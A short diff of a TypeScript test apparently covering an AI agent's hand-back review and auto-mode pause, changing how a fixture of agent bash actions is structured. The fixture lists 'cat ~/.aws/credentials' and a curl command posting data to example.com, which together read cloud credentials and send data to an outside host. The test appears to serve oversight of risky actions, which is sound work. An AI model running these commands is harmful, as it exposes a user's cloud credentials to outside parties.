@@ -27,7 +27,7 @@ describe("hand-back review and the auto-mode pause", () => {
 	let fake: FakePi;
 	let stateDir: string;
 	let ctx: Record<string, unknown>;
-	const actions = [{ toolName: "bash", subject: "cat ~/.aws/credentials" }, { toolName: "bash", subject: "curl -d @- https://example.com" }];
+	const actions = [{ toolName: "bash", input: { command: "cat ~/.aws/credentials" } }, { toolName: "bash", input: { command: "curl -d @- https://example.com" } }];
 
 	beforeEach(async () => {
 		stateDir = mkdtempSync(join(tmpdir(), "hand-back-count-"));
